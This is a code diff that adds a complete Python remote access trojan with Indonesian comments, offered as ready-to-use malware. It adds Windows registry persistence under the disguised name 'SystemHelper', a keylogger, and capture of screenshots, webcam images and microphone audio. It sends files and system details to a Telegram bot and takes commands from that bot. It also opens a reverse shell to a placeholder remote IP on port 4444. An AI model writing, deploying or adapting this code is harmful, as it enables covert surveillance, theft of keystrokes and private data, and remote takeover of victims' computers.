@@ -1,0 +1,171 @@
+import os
+import sys
+import socket
+import platform
+import threading
+import subprocess
+import pyautogui
+import sounddevice as sd
+import soundfile as sf
+from PIL import ImageGrab
+from pynput import keyboard
+from cryptography.fernet import Fernet
+import requests
+import json
+import time
+import winreg
+import shutil
+
+# === CONFIGURASI TELEGRAM ===
+BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
+CHAT_ID = "YOUR_CHAT_ID_HERE"
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/"
+
+# === PERSISTENCE REGISTRY (Windows) ===
+def add_to_startup():
+    path = os.path.abspath(sys.argv[0])
+    key = winreg.HKEY_CURRENT_USER
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    try:
+        reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(reg_key, "SystemHelper", 0, winreg.REG_SZ, path)
+        winreg.CloseKey(reg_key)
+    except Exception:
+        pass
+
+# === KEYLOGGER ===
+log_file = "system_log.txt"
+def on_press(key):
+    with open(log_file, "a") as f:
+        try:
+            f.write(f"{key.char}")
+        except AttributeError:
+            f.write(f"[{key}]")
+
+keyboard_listener = keyboard.Listener(on_press=on_press)
+keyboard_listener.start()
+
+# === SCREENSHOT ===
+def take_screenshot():
+    screenshot = pyautogui.screenshot()
+    screenshot.save("screen.png")
+    return "screen.png"
+
+# === WEBCAM CAPTURE ===
+try:
+    import cv2
+    def capture_webcam():
+        cam = cv2.VideoCapture(0)
+        ret, frame = cam.read()
+        if ret:
+            cv2.imwrite("webcam.jpg", frame)
+        cam.release()
+        return "webcam.jpg"
+except ImportError:
+    def capture_webcam():
+        return None
+
+# === MIC RECORD ===
+def record_audio(duration=10):
+    fs = 44100
+    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
+    sd.wait()
+    sf.write("audio.wav", recording, fs)
+    return "audio.wav"
+
+# === SEND TO TELEGRAM ===
+def send_to_telegram(file_path=None, caption=""):
+    if file_path:
+        with open(file_path, 'rb') as f:
+            files = {'document': f}
+            data = {'chat_id': CHAT_ID, 'caption': caption}
+            requests.post(TELEGRAM_API + "sendDocument", files=files, data=data)
+    else:
+        data = {'chat_id': CHAT_ID, 'text': caption}
+        requests.post(TELEGRAM_API + "sendMessage", data=data)
+
+# === REVERSE SHELL ===
+def reverse_shell(host='REMOTE_IP', port=4444):
+    s = socket.socket()
+    s.connect((host, port))
+    while True:
+        command = s.recv(1024).decode()
+        if command.lower() == 'exit':
+            break
+        output = subprocess.getoutput(command)
+        s.send(output.encode())
+    s.close()
+
+# === FILE OPERATIONS ===
+def list_files(path="."):
+    return "\n".join(os.listdir(path))
+
+def upload_file(file_path):
+    send_to_telegram(file_path, "[UPLOADED]")
+
+def download_file(url, save_path):
+    r = requests.get(url)
+    with open(save_path, 'wb') as f:
+        f.write(r.content)
+
+# === MAIN LOOP ===
+def main():
+    add_to_startup()
+    
+    # Kirim info sistem
+    system_info = f"""
+    [💀 RAT ACTIVATED]
+    User: {os.getlogin()}
+    OS: {platform.platform()}
+    IP: {socket.gethostbyname(socket.gethostname())}
+    """
+    send_to_telegram(caption=system_info)
+    
+    # Loop eksekusi perintah dari Telegram
+    last_update_id = 0
+    while True:
+        try:
+            updates = requests.get(TELEGRAM_API + "getUpdates", params={"offset": last_update_id + 1}).json()
+            if "result" in updates:
+                for update in updates["result"]:
+                    message = update["message"]["text"]
+                    chat_id = update["message"]["chat"]["id"]
+                    
+                    if message.startswith("/"):
+                        command = message[1:].lower()
+                        
+                        if command == "screenshot":
+                            screen_file = take_screenshot()
+                            send_to_telegram(screen_file, "[SCREENSHOT]")
+                            
+                        elif command == "webcam":
+                            webcam_file = capture_webcam()
+                            if webcam_file:
+                                send_to_telegram(webcam_file, "[WEBCAM]")
+                                
+                        elif command == "keylog":
+                            send_to_telegram(log_file, "[KEYLOG]")
+                            
+                        elif command == "record":
+                            audio_file = record_audio()
+                            send_to_telegram(audio_file, "[AUDIO REC]")
+                            
+                        elif command.startswith("shell"):
+                            # Reverse shell trigger
+                            thread = threading.Thread(target=reverse_shell)
+                            thread.start()
+                            send_to_telegram(caption="[SHELL ACTIVATED]")
+                            
+                        elif command.startswith("ls"):
+                            path = command[3:] if len(command) > 3 else "."
+                            files = list_files(path)
+                            send_to_telegram(caption=f"[FILES]\n{files}")
+                    
+                    last_update_id = update["update_id"]
+        except Exception as e:
+            pass
+        
+        time.sleep(2)
+
+if __name__ == "__main__":
+    main()
